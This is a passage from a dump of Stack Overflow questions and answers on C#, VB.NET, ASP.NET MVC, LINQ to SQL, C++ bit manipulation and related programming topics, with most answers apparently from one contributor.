<p>When I call it from <code>MyProgram.EXE</code>, I receive ""<code>AppName is: Utilities.dll</code>""</p>

<p>What I want is ""<code>AppName is: MyProgram.EXE</code>""</p>

<p>What am I doing wrong?</p>
","33708","Mehrdad Afshari","<p>Use <code>GetEntryAssembly()</code> instead to get the assembly containing the entry point.</p>

<p>The better way to do it is using <code>System.Environment.CommandLine</code> property instead.</p>

<p>Specifically:</p>

<pre><code>Dim location As String = System.Environment.GetCommandLineArgs()(0)
Dim appName As String = System.IO.Path.GetFileName(location)
Conole.WriteLine(""AppName is: {0}"", appName)
</code></pre>

<p>By the way, you want to use <code>GetFileName</code> instead of <code>GetDirectoryName</code></p>
"
"<p>I have a 100 classes that have some similar elements and some unique. I've created an interface that names those similar items eg: interface IAnimal. What i would normally do is:</p>

<pre><code>class dog : IAnimal
</code></pre>

<p>But there are 100 classes and i don't feel like going though them all and looking for the ones that i can apply IAnimal to.</p>

<p>What i want to do is this:</p>

<pre><code>dog scruffy = new dog();
cat ruffles = new cat();

IAnimal[] animals = new IAnimal[] {scruffy as IAnimal, ruffles as IAnimal} // gives null
</code></pre>

<p>or</p>

<pre><code>IAnimal[] animals = new IAnimal[] {(IAnimal)scruffy, (IAnimal)ruffles} //throws exception
</code></pre>

<p>then do</p>

<pre><code>foreach (IAnimal animal in animals)
{
   animal.eat();
}
</code></pre>

<p>Is there a way to make c# let me treat ruffles and scruffy as an IAnimal without having to write : IAnimal when writing the class.</p>

<p>Thanks!</p>

<p>EDIT (not lazy): The classes are generated off of sql stored proc metadata, which means every time it gets generated i would have to go back and add them in,or modify the code generator to identify the members that are in the interface, actually thats not a bad idea. I was hoping there was some sort of generics approach or something though.</p>
","33708","Mehrdad Afshari","<p>If you have already implemented the method and you just want to implement the interface, you can use a regular expression with replace in files command in your IDE.</p>

<p>Otherwise, take a look at extension methods. They might fit your need.</p>
"
"<p>My application runs on a pSOS operating system. The code is compiled with Diab C compiler.</p>

<p>The application defines a number of counters which have been declared as </p>

<pre><code>unsigned int call_count;
</code></pre>

<p>As there are chances of some of these overflowing in a small time frame, I have decided to declare the counters as  </p>

<pre><code>unsigned long long int call_count;
</code></pre>

<p>This I believe would not overflow at least during my lifetime.</p>

<p>My question is this conversion harmless? Are there any overhead that I need to concerned with. When the application is under stress the call_count would be incremented incessantly. Can performance take a hit ? A SNMP manager would be querying these counters every 15 seconds as well.</p>
","33708","Mehrdad Afshari","<p>I doubt there is a performance issue, at least if you use a 64 bit processor, since the variable is almost always in the cache.</p>
"
"<p>I have some ASP.NET page and webservice WebMethod() methods that I'd like to add some common code to.  For example:</p>

<pre><code>&lt;WebMethod()&gt; _
Public Function AddressLookup(ByVal zipCode As String) As Address
    #If DEBUG Then
        ' Simulate a delay
        System.Threading.Thread.Sleep(2000)
    #End If
    Return New Address()
End Function
</code></pre>

<p>I currently have the #If Debug code in all of my WebMethod() methods, but I am thinking there must be a better way to do this without having to actually type the code in.</p>

<p>Is there a way to determine if a request is to a WebMethod in Application_EndRequest so that I can add this delay project wide?</p>

<p>Note that some methods are Page methods and some are web service methods.</p>
","33708","Mehrdad Afshari","<p>Encapsulate the <code>#if DEBUG</code> code in a method and mark it with <code>&lt;Conditional(""DEBUG"")&gt;</code>. This way, you just write a method call in each <code>&lt;WebMethod&gt;</code>. Might be useful.</p>
"
"<p>I have a table, 'lasttraces', with the following fields.</p>

<pre><code>Id, AccountId, Version, DownloadNo, Date
</code></pre>

<p>The data looks like this:</p>

<pre><code>28092|15240000|1.0.7.1782|2009040004731|2009-01-20 13:10:22.000
28094|61615000|1.0.7.1782|2009040007696|2009-01-20 13:11:38.000
28095|95317000|1.0.7.1782|2009040007695|2009-01-20 13:10:18.000
28101|15240000|1.0.7.1782|2009040004740|2009-01-20 14:10:22.000
28103|61615000|1.0.7.1782|2009040007690|2009-01-20 14:11:38.000
28104|95317000|1.0.7.1782|2009040007710|2009-01-20 14:10:18.000
</code></pre>

<p>How can I, in <a href=""http://en.wikipedia.org/wiki/Language_Integrated_Query#LINQ_to_SQL"">LINQ&nbsp;to&nbsp;SQL</a>, only get the last lasttrace of every AccountId (the one with the highest date)?</p>
","33708","Mehrdad Afshari","<p>If you just want the last date for each account, you'd use this:</p>

<pre><code>var q = from n in table
        group n by n.AccountId into g
        select new {AccountId = g.Key, Date = g.Max(t=&gt;t.Date)};
</code></pre>

<p>If you want the whole record:</p>

<pre><code>var q = from n in table
        group n by n.AccountId into g
        select g.OrderByDescending(t=&gt;t.Date).FirstOrDefault();
</code></pre>
"
"<p>I'm debating about whether to learn GP-GPU stuff, such as CUDA, or whether to put it off.  My problem domain (bioinformatics) is such that it might be nice to know, since a lot of our problems do have massive parallelism, but most people in the field certainly don't know it.  My question is, how difficult the API for CUDA and other GP-GPU technologies to use in practice?  Is it extremely painful, or is most of the complexity well-encapsulated?  Does it feel like ""normal"" programming, or is the abstraction of complexity of running your code on the graphics card leaky to non-existent?</p>
","33708","Mehrdad Afshari","<p>In CUDA, you write in C, but you should exactly know what you are doing to achieve maximum performance. The concepts are not and should not be abstracted away since the GPU works <b>so differently</b>. The same is true for CPU SIMD instructions such as SSE. You, from a higher level perspective should know what you want to do with parallel facilities and utilize it the best way you can. You should break the problem to utilize parallelism efficiently. You should know how the GPU does the processing (SIMD style) and try to minimize jumps.</p>

<p>While you're using C syntax, it's not really abstracted away.</p>

<p>That said, it's far better than writing shaders in HLSL!</p>
"
"<p>I need to do a quick and dirty 'Country' --> 'State' drop down relationship on a web form.   I only am concerned with the states, provinces, and territories for USA and Canada, and this will be a relatively lightly used form, so a pure javascript solution is probably ideal.</p>
","33708","Mehrdad Afshari","<p>Create a JSON array:</p>

<pre><code>array = [ { name: ""United States"", states: [...] }, { ... } ];
</code></pre>

<p>When the value of the dropdown changes, fill in the other drop down with the contents of the particular element from the array.</p>
"
"<p>How do you access an integer (increment nCount++) in the main form from the method of an asynchronous callback function?</p>

<p>I know that with methods you have to check if invoke is required, then call begininvoke for the intended method as a delegate, as to avoid an illegal threading operation, but how an you perform a simple operation such as nCount++ from another thread?</p>
","33708","Mehrdad Afshari","<pre><code>Interlocked.Increment(ref variable);
</code></pre>
"
"<p>I want to take a floating point number in C++, like 2.25125, and a int array filled with the binary value that is used to store the float in memory (IEEE 754).</p>

<p>So I could take a number, and end up with a int num[16] array with the binary value of the float:
num[0] would be 1
num[1] would be 1
num[2] would be 0
num[3] would be 1
and so on...</p>

<p>Putting an int into an array isn't difficult, just the process of getting the binary value of a float is where I'm stuck. Can you just read the binary in the memory that the float variable? If not, how could I go about doing this in C++?</p>

<p>EDIT: The reason for doing the comparison this way is that I am wanting to learn to do bitwise operations in C++.</p>
","33708","Mehrdad Afshari","<pre><code>int fl = *(int*)&amp;floatVar; //assuming sizeof(int) = sizeof(float)

int binaryRepresentation[sizeof(float) * 8];

for (int i = 0; i &lt; sizeof(float) * 8; ++i)
    binaryRepresentation[i] = ((1 &lt;&lt; i) &amp; fl) != 0 ? 1 : 0;
</code></pre>

<h2>Explanation</h2>

<p><code>(1 &lt;&lt; i)</code> shifts the value <code>1</code>, <code>i</code> bits to the left.
The <code>&amp;</code> operator computes the <i>bitwise and</i> of the operands. </p>

<p>The <code>for</code> loop runs once for each of the 32 bits in the float. Each time, <code>i</code> will be the number of the bit we want to extract the value from. We compute the bitwise and of the number and <code>1 &lt;&lt; i</code>:</p>

<p>Assume the number is: 1001011, and <code>i = 2</code></p>

<p><code>1&lt;&lt;i</code> will be equal to 0000100</p>

<pre><code>  10001011
&amp; 00000100
==========
  00000000
</code></pre>

<p>if <code>i = 3</code> then:</p>

<pre><code>  10001011
&amp; 00001000
==========
  00001000
</code></pre>

<p>Basically, the result will be a number with <code>i</code>th bit set to the <code>i</code>th bit of the original number and all other bits are zero. The result will be either zero, which means the <code>i</code>th bit in the original number was zero or nonzero, which means the actual number had the <code>i</code>th bit equal to <code>1</code>.</p>
"
"<p>Sometimes the overhead of creating a new model type is annoying. In these cases, I want to set ViewData, and the options seem to be:</p>

<ol>
<li><p>Simply set viewdata with a string key, and cast it out. This has obvious problems.</p></li>
<li><p>Store the identifier (string key) somewhere (where? on the controller?) and cast it out on the viewpage. While solving one of the problems, I'm still casting, which is problematic, and kills type inference.</p></li>
<li><p>Use the MVCContrib strongly typed Set/Get functions. These are nice sometimes, but if the type isn't very descriptive, say a boolean ""IsNew"", they don't work too well. It also kills type inference and it's still pretty much just doing a cast, so I must manually sync up the view and controller.</p></li>
</ol>

<p>So, instead I'm thinking of using a phantom type to combine both the type and key identifier. It'd be equivalent to this psuedo-C#:</p>

<pre><code>class ViewDataKey&lt;T&gt; = string
</code></pre>

<p>This would let me create identifiers in the controller like this:</p>

<pre><code>public static readonly ViewDataKey&lt;bool&gt; IsNew = ""IsNew"";
</code></pre>

<p>With some simple extension methods, setting the data would be:</p>

<pre><code>  ViewData.Set(IsNew, true);
</code></pre>

<p>Getting it out is just as easy:</p>

<pre><code>var isNew = ViewData.Get(FrobNozzleController.IsNew);
</code></pre>

<p>Notice we don't need to specify the type of isNew, it's safely inferred. The key and type definitons are stored in one location.</p>

<p>Questions:</p>

<ol>
<li><p>Where should the key be stored? For ""global-ish"" ViewData, some common class works fine. But for View/Controller specific data? Is there any downside to putting it on the controller? (Apart from the long name of the controller?)</p></li>
<li><p>Are there any easier ways, or things already built-in?</p></li>
</ol>
","33708","Mehrdad Afshari","<p>I think this is what the model does in the MVC pattern. Why you don't use a typed view instead? </p>

<p>I believe you just make things more complicated by introducing yet another dependency between the controller and the view. I don't see any specific benefit in terms of line of code or something like that. You have to declare the existence of the variable, which you'd also do in the model class definition. </p>

<p>You don't get any significant advantage by doing so. </p>
"
"<p>I've created a .NET winforms MVC.  The Controller and View are in the same EXE.  Model is in a set of DLLs that get used by several groups.  The MVC is very explicit.  Model knows nothing of Controller and Controller knows nothing of View.  I'm thinking to put the Controller in its own DLL so that it can be unit tested.  Highly unlike someone will reuse the controller.  Unit testing is the only reason <em>I have</em> for the move into a DLL.</p>

<p>Conceptually, should the controller always be in the same assembly as the View?  What are reasons for/against keeping them together?</p>
","33708","Mehrdad Afshari","<p>Separation of controllers and views are an abstract concept. There's no strict rule that you should physically keep them separate (just like tiers in a three-tier application). However there might be some advantages in either approach.</p>

<p>Separating assemblies has the following benefits:</p>

<ul>
<li>Reduces the possibility to accidentally couple views to controllers and breaking the separation.</li>
<li>Makes it easier to edit views without recompiling controllers at all (which is great from a deployment perspective).</li>
<li>Building views and controllers become separated, so you can test the one of them even if the other does not build at all.</li>
</ul>

<p>However, it might be unfeasible for small projects. For very small projects you might want to ship a single executable and nothing else along it. Also, you might not want to create 3 separate projects. </p>

<p>Hey, you might not wanna unit test it at all ;) Ouch, my head is hurt, where did this big brick come from? :))</p>
"
"<p>I have a html.actionlink that i wish to display a link to a members profile page like this: <a href=""http://somesite.com/members/"" rel=""nofollow"">http://somesite.com/members/</a>{username}</p>

<p>When use the following markup</p>

<pre><code>&lt;%= Html.ActionLink(r.MemberName, ""profile"", new { MemberName = r.MemberName } )%&gt;
</code></pre>

<p>I get a link that looks like this: <a href=""http://somesite.com/members?MemberName="" rel=""nofollow"">http://somesite.com/members?MemberName=</a>{username}</p>

<p>What would i need to change in the ActionLink helper to achieve a url like this: </p>

<p><a href=""http://somesite.com/members/"" rel=""nofollow"">http://somesite.com/members/</a>{username}</p>
","33708","Mehrdad Afshari","<p>You should add the route that maps ""/members/{MemberName}"" before other routes in the routing table.</p>
"
"<p>Since I can't use Microsoft as an example for best practice since their exception messages are stored in resource files out of necessity, I am forced to ask where should exception messages be stored.</p>

<p>I figure it's probably one of common locations I thought of</p>

<ul>
<li>Default resource file</li>
<li>Local constant</li>
<li>Class constant</li>
<li>Global exception message class</li>
<li>Inline as string literals</li>
</ul>
","33708","Mehrdad Afshari","<p>Out of necessity? It's to ease localization. To localize error messages in your applications, it's a great way.</p>
"
"<p>I'm developing an ASP.NET 2.0 app using Visual Studio 2008.  </p>

<p>If I want to run a really quick test on a method that's way in my back-end, is there a way for me to just call a main function in that class via command line?</p>

<p>Thanks</p>
","33708","Mehrdad Afshari","<p>That's what a test project is made for.</p>
"
"<p>My title is the full question: What is the build number of SQL Server 2008 Web Edition that RTMed?</p>
","33708","Mehrdad Afshari","<pre><code>SELECT @@VERSION

Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)
</code></pre>
"
"<p>I have a customer index page that displays customer lists.  I have a search functionality within this page and I want the url to be <a href=""http://mysite/search?id=434"" rel=""nofollow"">http://mysite/search?id=434</a> when i perform the search. The index page will also display the search result.</p>

<p>Thanks</p>
","33708","Mehrdad Afshari","<p>No, you shouldn't have. Just use <code>View(""ViewName"");</code> in the controller to show the appropriate view in other actions.</p>
"
"<p>I am writing a small matrix library in C++ for matrix operations. However my compiler complains, where before it did not. This code was left on a shelf for 6 months and in between I upgraded my computer from debian etch to lenny (g++ (Debian 4.3.2-1.1) 4.3.2
) however I have the same problem on a Ubuntu system with the same g++.</p>

<p>Here is the relevant part of my matrix class:</p>

<pre><code>namespace Math
{
    class Matrix
    {
    public:

        [...]

        friend std::ostream&amp; operator&lt;&lt; (std::ostream&amp; stream, const Matrix&amp; matrix);
    }
}
</code></pre>

<p>And the ""implementation"":</p>

<pre><code>using namespace Math;

std::ostream&amp; Matrix::operator &lt;&lt;(std::ostream&amp; stream, const Matrix&amp; matrix) {

    [...]

}
</code></pre>

<p>This is the error given by the compiler:</p>

<blockquote>
  <p>matrix.cpp:459: error: 'std::ostream&amp;
  Math::Matrix::operator&lt;&lt;(std::ostream&amp;,
  const Math::Matrix&amp;)' must take
  exactly one argument</p>
</blockquote>

<p>I'm a bit confused by this error, but then again my C++ has gotten a bit rusty after doing lots of Java those 6 months. :-)</p>
","33708","Mehrdad Afshari","<p>You have declared your function as <code>friend</code>. It's not a member of the class. You should remove <code>Matrix::</code> from the implementation. <code>friend</code> means that the specified function (which is not a member of the class) can access private member variables. The way you implemented the function is like an instance method for <code>Matrix</code> class which is wrong.</p>
"
"<p>i'm developing a simple C# Editor for one of my university courses and I need to send a .cs file to Compiler and collect errors (if they exist) and show them in my app. In other words i want to add a C# Compiler to my Editor. Is there anything like this for the debugger?</p>
","33708","Mehrdad Afshari","<p>Use the <code>System.Diagnostics.Process</code> class to start a generic process and collect the I/O from standard input/output.</p>

<p>For this specific scenario, I suggest you look at <code>Microsoft.CSharp.CSharpCodeProvider</code> class. It'll do the task for you.</p>
"
"<p>Would you be aware of any tools(preferably free) or browser plugins that would allow me to easily determine the styling properties of an element on the web page. </p>

<p>For example it could be a tool that would import all the styling information from the css files associated with the page and presented it as an in-line styling.</p>

<p>Eventually some sort of  browser plugin that would alow me to select an element and then would dispaly the styling information.</p>
","33708","Mehrdad Afshari","<p>Safari and Chrome have a built in Web Inspector, right click and select Inspect Element. Firefox has the Firebug plugin. IE has IE Dev Toolbar.</p>
"
"<p>I am using C# and a console app and I am using this script to download files from a remote server. There area a couple of things I want to add. First, when it writes to a file, it doesn't take into consideration a newline. This seems to run a certain amount of bytes and then goes to a newline. I would like it to keep the same format as the file it is  reading from. Second, there are multiple .jpg files on the server that I need to download. How can I use this script to download multiple, .jpg files</p>

<pre><code>public static int DownLoadFiles(String remoteUrl, String localFile)
    {
        int bytesProcessed = 0;

        // Assign values to these objects here so that they can
        // be referenced in the finally block
        StreamReader remoteStream = null;
        StreamWriter localStream = null;
        WebResponse response = null;

        // Use a try/catch/finally block as both the WebRequest and Stream
        // classes throw exceptions upon error
        try
        {
            // Create a request for the specified remote file name
            WebRequest request = WebRequest.Create(remoteUrl);
            request.PreAuthenticate = true;
            NetworkCredential credentials = new NetworkCredential(""id"", ""pass"");
            request.Credentials = credentials;

            if (request != null)
            {
                // Send the request to the server and retrieve the
                // WebResponse object
                response = request.GetResponse();
                if (response != null)
                {
                    // Once the WebResponse object has been retrieved,
                    // get the stream object associated with the response's data
                    remoteStream = new StreamReader(response.GetResponseStream());

                    // Create the local file
                    localStream = new StreamWriter(File.Create(localFile));

                    // Allocate a 1k buffer
                    char[] buffer = new char[1024];
                    int bytesRead;

                    // Simple do/while loop to read from stream until
                    // no bytes are returned
                    do
                    {
                        // Read data (up to 1k) from the stream
                        bytesRead = remoteStream.Read(buffer, 0, buffer.Length);

                        // Write the data to the local file
                        localStream.WriteLine(buffer, 0, bytesRead);

                        // Increment total bytes processed
                        bytesProcessed += bytesRead;
                    } while (bytesRead &gt; 0);
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
        finally
        {
            // Close the response and streams objects here
            // to make sure they're closed even if an exception
            // is thrown at some point
            if (response != null) response.Close();
            if (remoteStream != null) remoteStream.Close();
            if (localStream != null) localStream.Close();
        }

        // Return total bytes processed to caller.
        return bytesProcessed;
</code></pre>
","33708","Mehrdad Afshari","<p>Why don't you use <code>WebClient.DownloadData</code> or <code>WebClient.DownloadFile</code> instead?</p>

<pre><code>WebClient client = new WebClient();
client.Credentials = new NetworkCredentials(""id"", ""pass"");
client.DownloadFile(remoteUrl, localFile);
</code></pre>

<p>By the way the correct way to copy a stream to another is not what you did. You shouldn't read into <code>char[]</code> at all, as you might run into encoding and end of line issues as you are downloading a binary file. The <code>WriteLine</code> method call is problematic too. The right way to copy contents of a stream to another is:</p>

<pre><code>void CopyStream(Stream destination, Stream source) {
   int count;
   byte[] buffer = new byte[BUFFER_SIZE];
   while( (count = source.Read(buffer, 0, buffer.Length)) &gt; 0)
       destination.Write(buffer, 0, count);
}
</code></pre>

<p>The <code>WebClient</code> class is much easier to use and I suggest using that instead.</p>
"
"<p>I am trying to call a .asmx (WSE) web service from a .net 3.5 application.</p>

<p>This is possible correct?
It seems when I add a web reference the API is completely different than when I add a reference in a .net 2.0 app.</p>
","33708","Mehrdad Afshari","<p>You can use the Add Web Reference button in the dialog displayed (Add service reference) to add a pre-3.0 style reference. </p>

<p>By default, when you add a service reference, VS will generate a class that uses WCF. It's not an issue but you might prefer to stick to the old style.</p>

<p>By the way, WCF is more flexible and unified approach to communication in .NET 3.0 onwards. You should consider it.</p>
"
"<p>I am in a situation where my application has to read an XML file that another application will drop onto a specific location on the file system (on multiple platforms).  I control the contents of this document.  The other application is simply providing transport.</p>

<p>I'd like to ensure that the document hasn't been modified in transit or forged in any way.  Currently, we're simply writing a salted hash of the document string to the start of the file before the XML document itself.  When we parse the document, we simply strip out the hash, compare it to a hash of the remainder of the document, and then send it to the parser.</p>

<p>Does anyone have any experience with this kind of scenario that they'd like to share?  Are there any flaws or easier ways I'm missing?</p>
","33708","Mehrdad Afshari","<p>You should sign the message by encrypting the salted hash with an asymmetric encryption algorithm and send it along the document. Just using a hash doesn't enforce security as some intruder might generate a different message with the same hash.</p>
"
"<p>Why would an event handler work one day, and then stop working the next day without <em>any</em> code changes?</p>

<p>I have run into the problem many times, but always have to play around and somehow the event handler magically works again.  Below is an example where this happened to me again today.  Do you know a quick way to fix this type of problem?</p>

<pre><code>&lt;asp:LinkButton ID=""LinkButton1"" runat=""server"" OnClick=""LinkButton1_Click""&gt;
    Link
&lt;/asp:LinkButton&gt;
</code></pre>

<p>I set a breakpoint on this method and it never gets hit.</p>

<pre><code>protected void LinkButton1_Click(object sender, EventArgs e)
{
    // snip
}
</code></pre>

<p>I have tried cleaning the solution, rebuilding all, etc.  Any insight here?</p>

<p>Edit:</p>

<p>Yes, AutoEventWireup is set to true.  No other system/development environment changes were made.  I'm using .NET 3.5.</p>
","33708","Mehrdad Afshari","<p>Does your <code>aspnet_client</code> folder match the .NET framework version installed on the server? If you use a pre-2.0 .NET framework, this version mismatch between the framework and <code>aspnet_client</code> scripts is known to cause problems.</p>
"
"<p>Is there a way to reserve or skip or increment value of identity column? </p>

<p>I Have two tables joined in one-to-one relation ship. First one has IDENTITY PK column, and second one int PK (not IDENTITY). I used to insert in first, get ID and insert in second. And it works ok.</p>

<p>Now I need to insert values in second table without inserting into first. </p>

<p>Now, how to increment IDENTITY seed, so I can insert it into second table, but leave ""hole"" in ID's of first table? </p>

<p><strong>EDIT: More info</strong> </p>

<p>This works:   </p>

<pre><code>-- I need new seed number, but not table row 
-- so i will insert foo row, get id, and delete it
INSERT INTO TABLE1 (SomeRequiredField) VALUES ('foo'); 
SET @NewID = SCOPE_IDENTITY(); 
DELETE FROM TABLE1 WHERE ID=@NewID;

-- Then I can insert in TABLE2  
INSERT INTO (ID, Field, Field) VALUES (@NewID, 'Value', 'Value');
</code></pre>

<p>Once again - this works. </p>

<p>Question is can I get ID without inserting into table?</p>

<p>DBCC needs owner rights; is there a clean user callable SQL to do that?</p>
","33708","Mehrdad Afshari","<p>Use a <a href=""http://technet.microsoft.com/en-us/library/ms176057.aspx"" rel=""nofollow""><code>DBCC CHECKIDENT</code></a> statement.</p>
"
"<p>Is there a way to convert a <code>List(of Object)</code> to a <code>List(of String)</code> in c# or vb.net without iterating through all the items? (Behind the scenes iteration is fine - I just want concise code)</p>

<p><strong>Update:</strong>
The best way is probably just to do a new select</p>

<pre><code>myList.Select(function(i) i.ToString())
</code></pre>

<p>or</p>

<pre><code>myList.Select(i =&gt; i.ToString());
</code></pre>
","33708","Mehrdad Afshari","<p>Not possible without iterating to build a new list. You can wrap the list in a container that implements IList.</p>

<p>You can use LINQ to get a lazy evaluated version of <code>IEnumerable&lt;string&gt;</code> from an object list like this:</p>

<pre><code>var stringList = myList.OfType&lt;string&gt;();
</code></pre>
"
"<p>In which cases is it recommended to use virtual or abstract? Which is the more correct approach? </p>
","33708","","<ol>
<li>Only <code>abstract</code> classes can have <code>abstract</code> members.</li>
<li>A non-<code>abstract</code> class that inherits from an <code>abstract</code> class <strong>must</strong> <code>override</code> its <code>abstract</code> members.</li>
<li>An <code>abstract</code> member is implicitly <code>virtual</code>.</li>
<li>An <code>abstract</code> member cannot provide any implementation (<code>abstract</code> is called <code>pure virtual</code> in some languages).</li>
</ol>
"
"<p>I have some neural net code written in c# that would benefit from using <a href=""http://go-mono.com/docs/index.aspx?tlink=0@N%3aMono.Simd"">SIMD</a> support. <a href=""http://www.mono-project.com/news/archive/2009/Jan-13.html"">Mono 2.2</a> just came out that supports SIMD but Microsoft's c# does not support this yet.  Being happy with my c# setup I was wondering if I could write a lib in mono for that piece and call it from .net.</p>

<p>Edit:
I guess what I really want to know is it possible to compile <a href=""http://www.mono-project.com/Main%5FPage"">mono</a> down to something like a DLL that I then can call from dotnet. I heard <a href=""http://en.wikipedia.org/wiki/Miguel%5Fde%5FIcaza"">Miguel de Icaza</a> on a <a href=""http://www.hanselminutes.com/default.aspx?showID=157"">podcast</a> saying that for the iphone the mono compiler would allow them to compile down to an exe for moonlight so it did not violate the terms of service for iphone so it got me thinking what else can you compile to.</p>

<p>I heard Miguel de Icaza on another pod cast <a href=""http://herdingcode.com/?p=109"">Herding Code Episode 28</a> say that you could use the mono complier to compile to an exe not just to intermediate code. What are the implications of this? </p>

<p>This got my curiosity up so I thought that I would throw a bounty at it.</p>
","33708","Mehrdad Afshari","<p>In order to take advantage of SIMD features, the runtime should be able to natively support it. Basically, Mono treats <code>Mono.Simd</code> namespace specially in the runtime. Obviously, Microsoft .NET runtime does not support this feature. However, the <code>Mono.Simd</code> assembly provided is a completely valid and normal .NET assembly written in managed code and therefore it can run on .NET CLR, but it would be just a software emulation of what SIMD instructions do.</p>

<p>You can run Mono runtime on Windows and take advantage of those features but there is no direct way to run half of application on .NET and the other half on Mono (you could, of course, use communication mechanisms as two distinct applications can use, but it doesn't make sense for this scenario at all).</p>
"
"<p>Given a <code>List&lt;T&gt;</code> in c# is there a way to extend it (within its capacity) and set the new elements to <code>null</code>? I'd like something that works like a <code>memset</code>. I'm not looking for sugar here, I want fast code. I known that in C the operation could be done in something like 1-3 asm ops per entry.</p>

<p>The best solution I've found is <a href=""http://stackoverflow.com/questions/481334/best-c-data-structure-for-random-order-population#481350"">this</a>:</p>

<pre><code>list.AddRange(Enumerable.Repeat(null, count-list.Count));
</code></pre>

<p>however that is c# 3.0 (&lt;3.0 is preferred) and might be generating and evaluating an enumerator.</p>

<p>My current code uses:</p>

<pre><code>while(list.Count &lt; lim) list.Add(null);
</code></pre>

<p>so that's the starting point for time cost.</p>

<p>The <a href=""http://stackoverflow.com/questions/481334/best-c-data-structure-for-random-order-population"">motivation for this</a> is that I need to set the n'th element even if it is after the old Count. </p>
","33708","Mehrdad Afshari","<pre><code>static IEnumerable&lt;T&gt; GetValues&lt;T&gt;(T value, int count) {
   for (int i = 0; i &lt; count; ++i)
      yield return value;
}

list.AddRange(GetValues&lt;object&gt;(null, number_of_nulls_to_add));
</code></pre>

<p>This will work with 2.0+</p>
"
"<p>What should be the general guidelines/gotchas for dividing application code (App_Code) into separate files?</p>

<p>I've found that over time, the original files do not match up well with how the namespace hierarchy evolves. How do I keep application code containers organized intuitively over time? </p>

<p>What PURPOSE should the file divisions aim towards? Code portability? Separation of concerns? General functional context? Frequency of change? Should they strive for 1-1 relationship with classes? </p>

<p>What are the implications of splitting the code into MANY smaller files vs consolidated into few files?</p>

<p>I've often thought about this but never really reached any general conclusions that apply to all situations. </p>
","33708","Mehrdad Afshari","<p>Most recommendations I saw say that every public type should be in its own file and namespaces should represent the folder structure of the application.</p>
"
"<p>I'm working with Ruby on Rails and would like to validate two different models :</p>

<pre><code>if (model1.valid? &amp;&amp; model2.valid?)
...
end
</code></pre>

<p>However, ""&amp;&amp;"" operator uses short-circuit evaluation (i.e. it evaluates ""model2.valid?"" only if ""model1.valid?"" is true), which prevents model2.valids to be executed if model1 is not valid.</p>

<p>Is there an equivalent of ""&amp;&amp;"" which would not use short-circuit evaluation? I need the two expressions to be evaluated.</p>
","33708","Mehrdad Afshari","<p>Evaluate them separately and store the result in a variable. Then use a simple &amp;&amp; between those booleans :)</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/65512/which-is-faster-best-select-or-select-column1-colum2-column3-etc"">Which is faster/best? SELECT * or SELECT column1, colum2, column3, etc</a><br>
  <a href=""http://stackoverflow.com/questions/321299/what-is-the-reason-not-to-use-select"">What is the reason not to use select *?</a>  </p>
</blockquote>



<p>Is there any performance issue in using SELECT * rather than SELECT FiledName, FiledName2 ... ?</p>
","33708","Mehrdad Afshari","<p>If all fields are specified, then no, there shouldn't be a meaningful difference performance-wise. But if you just want a couple specific fields from a table with a dozen columns, it's slower. </p>

<p>There are readability and maintainability issues with <code>SELECT *</code>. It makes sense to use specific field names all the time, even if you want to select all fields.</p>
"
"<p>Using .net MVC and I am doing some server side validation in my Action that handles the form post.</p>

<p>What is a good technique to pass the errors back to the view?</p>

<p>I am thinking of creating an error collection, then adding that collection to my ViewData and then somehow weave some javascript (using jQuery) to display the error.</p>

<p>It would be nice it jQuery had some automagic way of display an error since this is a common pattern.</p>

<p>What do you do?</p>
","33708","Mehrdad Afshari","<p><code>ViewData.ModelState</code> is designed to pass state information (errors) from the controller to the view.</p>
"
"<p>Looked for an answer to this and didn't see it. </p>

<p>This is for IIS 6.0 / Windows Server 2003. </p>

<p>I'm working with an extremely large ASP/ASP.NET application and I'm trying to get my development environment to match my team members environment. This process is basically trial and error: get an error, go into IIS, make a change, hope the error is fixed. Ugh. I'm hoping to find a way to <strong>replicate a set of IIS directories and their configurations</strong> on one machine onto my machine. </p>

<p>I did find a script that will iterate through and give me a list of all virtual directories on a machine. It helped, but not a lot since I still have to go in and set up all those virtual directories (I think there are like 20 of them ballpark). The whole process is complicated by the fact that we're mixing ASP and ASP.NET applications in the same application which spans many solutions and projects. Getting the whole thing up and going seems like way too much work but I've never heard of a real solution to this. </p>

<p>Would Powershell be helpful here?  </p>
","33708","Mehrdad Afshari","<p>You should export and import IIS metabase.</p>

<p>These might help:</p>

<ul>
<li><a href=""http://weblogs.asp.net/owscott/archive/2006/06/07/IISCnfg.vbs---IIS-Settings-Replication.aspx"" rel=""nofollow"">IIS Settings Replication</a> </li>
<li><a href=""http://web-developer.boeldt.net/IIS_Metabase_Backup.asp"" rel=""nofollow"">IIS Metabase Backup and Restore</a></li>
</ul>

<p>Fortunately, in IIS7, ASP.NET config is integrated with IIS config so the job is done by copying <code>Web.config</code>.</p>
"
"<p>I'm writing the <code>RenderContents()</code> method of my ASP.NET server control. The method uses an <code>HtmlTextWriter</code> object to render the output content. For the control I'm writing, using the <code>HtmlTextWriter</code>'s methods seems like it will require a lot of lines of code to open and close every tag and add every attribute to the stream. In the end I feel like I'm going to end up with code that is a lot longer than it needs to be.</p>

<p>I was thinking that if I used a chainable class such as <code>StringBuilder</code>, my code would be a lot cleaner to read and easier to write.</p>

<p>What I was wondering was, is there any reason to use the <code>HtmlTextWriter</code> object to render my entire control's contents? Other than the safety checks (I'm assuming) it includes to make sure you don't write tags in the wrong order or create invalid markup, I don't see a reason.</p>

<p>It seems like it would be easier to just do something like this:</p>

<pre><code>protected override void RenderContents(HtmlTextWriter output)
{
    StringBuilder s = new StringBuilder();
    s.Append(""lots"")
     .Append(""of"")
     .Append(""strings"");

    output.BeginRender();
    output.Write(s.ToString());
    output.EndRender();
}
</code></pre>

<p>Is there any reason why this would be a bad idea?</p>

<p><strong>Update</strong><br />
In response to <a href=""http://stackoverflow.com/questions/489691#489711"">Mehrdad Afshari</a>'s answer:<br />
 I didn't think much about the memory requirements of having a separate <code>StringBuilder</code> object instantiated. What about making a wrapper for HtmlTextWriter so that it can be chained so that an extra string isn't made.</p>

<pre><code>public class ChainedHtmlTextWriter
{
    private HtmlTextWriter _W;
    public ChainedHtmlTextWriter(HtmlTextWriter writer)
    {
        _W = writer;
    }

    public ChainedHtmlTextWriter Write&lt;T&gt;(T value) 
    { 
        _W.Write(value); 
        return this; 
    }

    public ChainedHtmlTextWriter WriteLine&lt;T&gt;(T value)
    {
